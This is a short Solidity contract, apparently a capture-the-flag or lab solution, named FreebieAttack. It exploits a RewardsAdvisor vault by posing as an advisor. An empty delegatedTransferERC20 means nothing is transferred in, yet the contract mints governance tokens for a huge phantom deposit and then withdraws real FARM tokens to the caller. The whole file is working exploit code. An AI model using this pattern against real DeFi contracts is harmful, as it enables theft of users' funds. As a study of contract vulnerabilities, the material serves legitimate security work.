// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

import {GovToken} from "src/freebie/GovToken.sol";
import {RewardsAdvisor, IAdvisor} from "src/freebie/RewardsAdvisor.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FreebieAttack is IAdvisor {
    IERC20 public farm;
    GovToken public xFarm;
    RewardsAdvisor public rewardsAdvisor;
    address public owner;

    constructor(IERC20 _farm, GovToken _xFarm, RewardsAdvisor _rewardAdvisor) payable {
        farm = _farm;
        xFarm = _xFarm;
        rewardsAdvisor = _rewardAdvisor;
        owner = address(this);
    }

    function attack() public {
        rewardsAdvisor.deposit({farmDeposit: 10000e22, from: payable(address(this)), to: address(this)});

        console.log("xFARM minted:", xFarm.balanceOf(address(this)));

        rewardsAdvisor.withdraw({shares: xFarm.balanceOf(address(this)), to: msg.sender, from: payable(address(this))});

        console.log("FARM:", farm.balanceOf(msg.sender));
    }

    function delegatedTransferERC20(address token, address to, uint256 amount) public {}
}
